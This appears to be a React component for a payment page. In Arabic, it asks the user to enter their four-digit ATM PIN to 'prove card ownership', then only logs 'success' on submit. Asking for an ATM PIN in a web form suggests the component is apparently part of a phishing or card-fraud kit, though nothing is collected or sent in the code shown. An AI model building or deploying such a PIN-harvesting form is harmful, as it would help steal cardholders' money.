import InputWithClearIcon from "../components/InputWithClearIcon";

const SecretCode = () => {
  const goNext = (e) => {
    e.preventDefault();
    console.log("success");
  };
  return (
    <>
      <div className="bg-main/20 rounded-2xl mt-4 py-3 px-4">
        <h2 className="text-xl font-bold text-main">إثبات ملكية البطاقة</h2>
        <p className="text-gray-600">
          الرجاء إدخال رقم البطاقة السري للصراف الألي (ATM) المكون من 4 خانات
          للتأكد من عملية الدفع
        </p>
      </div>
      <form
        onSubmit={goNext}
        className="mt-8 w-full grid grid-cols-6 items-end gap-6"
      >
        <div className="col-span-6">
          <InputWithClearIcon
            label="الرقم السري"
            id="secret-code"
            placeholder="أدخل رمز التخقق هنا"
            rtl={true}
            type="tel"
            max={4}
          />
        </div>

        <div className="col-span-6 flex flex-col lg:flex-row sm:items-center gap-4">
          <button
            className="w-full lg:text-xl capitalize rounded-md font-bold py-3 px-6 bg-[#76b456] hover:brightness-110 text-white transition-colors"
            type="submit"
          >
            تأكيد
          </button>
        </div>
      </form>
    </>
  );
};
export default SecretCode;
